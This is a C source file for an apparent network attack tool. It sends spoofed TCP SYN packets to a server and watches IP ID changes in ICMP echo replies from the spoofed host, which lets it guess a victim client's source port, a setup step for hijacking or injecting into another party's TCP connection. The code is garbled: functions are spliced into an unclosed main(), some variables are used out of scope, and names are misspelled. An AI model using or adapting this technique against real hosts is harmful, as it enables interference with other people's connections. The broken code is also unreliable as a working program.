#include <unistd.h>
#include <sys/time.h>
#include <stdio.h>
#include <stdlib.h>
#include "xlayer.h"
#include "datalink.h"


int
echo_get_id(struct datalink *dl,
                struct MAC *srcmac,
                struct MAC *dstmac,
		uint32_t real_ip,
                uint32_t src,
                uint32_t *dly,
                uint16_t *ip_id
		);
void
usage(const char *pgm)
{
 fprintf(stderr,"usage: %s <interface> <real ip> <gateway ip> <spoof ip> <server ip> <start port> <end port> <server port>\n",pgm);
 exit(0);
}

int
main(int argc,char **argv){
	char icmp_fitler[128];


	snprintf(icmp_filter,sizeof(icmp_filter),"icmp and icmp[0] = 0 and "
		"src %s and dst %s",
		argv[4],argv[2]);

int
open_datalinks(struct datalink *dl,struct datalink *icmp_dl,
		char *device,char *icmp_filter)
{
        char icmp_filter[128];
        memset(dl,0,sizeof(dl));
        if( if_openbyname(dl,device) < 0 ){
                fprintf(stderr,"open_link_byname failed\n");
                return 1;
        }

        memset(icmp_dl,0,sizeof(dl));
        if( if_openbyname(icmp_dl,device) < 0 ){
                fprintf(stderr,"open_link_byname failed\n");
                return 1;
        }
        filterDatalink(icmp_dl,icmp_filter);


}
unsigned short
find_cli_port(struct datalink *dl,struct datalink *icmp_dl,
	struct MAC *localmac,
	struct MAC *gwmac,
	uint32_t real_ip,
	uint32_t spoof_ip,
	uint32_t server_ip,
	uint16_t server_port,
	uint16_t start_port,
	uint16_t end_port)
{

	struct layer *proto;
	uint32_t dly;
	struct TCPSocket ts;
	uint16_t 
		ip_id_a,ip_id_b,ip_id_d;
	int i;
	unsigned int guess_port,min_delta=-1;
	if( argc < 9 )
		usage(*argv);
	srand(time(NULL));
	memset(&dl,0,sizeof(dl));
	if( if_openbyname(&dl,argv[1]) < 0 ){
		fprintf(stderr,"open_link_byname failed\n");
		return 1;
	}

	memset(&icmp_dl,0,sizeof(dl));
	if( if_openbyname(&icmp_dl,argv[1]) < 0 ){
		fprintf(stderr,"open_link_byname failed\n");
		return 1;
	}
	guess_port = start_port;
	str_to_ip(argv[2],&real_ip);	
	str_to_ip(argv[3],&gw_ip);	
	str_to_ip(argv[4],&spoof_ip);	
	str_to_ip(argv[5],&server_ip);	
	memcpy(&localmac.mac,dl.dl_mac,6);

	snprintf(icmp_filter,sizeof(icmp_filter),"icmp and icmp[0] = 0 and "
		"src %s and dst %s",
		argv[4],argv[2]);
	if( dl.dl_pcap->linktype == DLT_EN10MB ){
		if( ARPRequest(&dl,&localmac,&gwmac,real_ip,gw_ip,5) < 0 ){
			fprintf(stderr,"lan gateway did not reply arp\n");
		exit(1);
		}

	}
	start_port = atoi(argv[6]);
	end_port = atoi(argv[7]);
	server_port = atoi(argv[8]);
	createSocket(&ts,&localmac,&gwmac,spoof_ip,
		server_ip,start_port,server_port);

	for( i = start_port; i<= end_port; i++ ){
		ip_id_a = ip_id_b = ip_id_d = 0;

		echo_get_id(&icmp_dl,&localmac,&gw_mac,real_ip,spoof_ip,
		&dly,&ip_id_a);
		printf("delay = %lu\n",dly);		
		usleep(dly);
		SYN(&ts,&dl);
		
                echo_get_id(&icmp_dl,&localmac,&gw_mac,real_ip,spoof_ip,
                &dly,&ip_id_b);

		ip_id_d = ip_id_b - ip_id_a;
		if(ip_id_d < min_delta){
			min_delta = ip_id_d;
			guess_port = i;
		}

		printf("for port %d ip_id delta = %x\n",ts.port,ip_id_d);			if(ip_id_d == 0 ){
			printf( " the client port is: %d\n",ts.port);	exit(0);
		}

		ts.port++;
		ts.seq++;
	}
	printf("guessed port is %d\n",guess_port);
	return 0;
}
		
	
int
echo_get_id(struct datalink *dl,
		struct MAC *srcmac,
		struct MAC *dstmac,
		uint32_t real_ip,
		uint32_t src,
		uint32_t *dly,
		uint16_t *ip_id
		)
{

	struct timeval tva,tvb;
	struct layer *proto;
	int n;
	if(gettimeofday(&tva,NULL) < 0 ){
		fprintf(stderr,"gettimeofday returned error %s\n"			,strerror(errno));
		return -1;
	}


        ICMPEchoRequest(dl,srcmac,dstmac,real_ip,src,rand()%0xFFFF
, rand()%0xffff);


	proto = recvlayers(dl,&n);
	if( proto == NULL ){
		fprintf(stderr,"recvlayers returned error %s\n"
			,strerror(errno));
		return -1;
	}
	if(gettimeofday(&tvb,NULL) < 0 ){
		fprintf(stderr,"gettimeofday returned error %s\n"			,strerror(errno));
		return -1;
	}


	*dly = tvb.tv_usec - tva.tv_usec;

	proto = findlayer(proto,LT_IP);
	
 	fprintf(stderr,"ip_id=%x\n",ntohs(((xip)proto->proto)->ip_id));	
	if( proto == NULL ){
		fprintf(stderr,"findlayer returned error %s\n"
			,strerror(errno));
		return -1;
	}
	*ip_id = ntohs( ((xip)proto->proto)->ip_id);

	return 0;
}
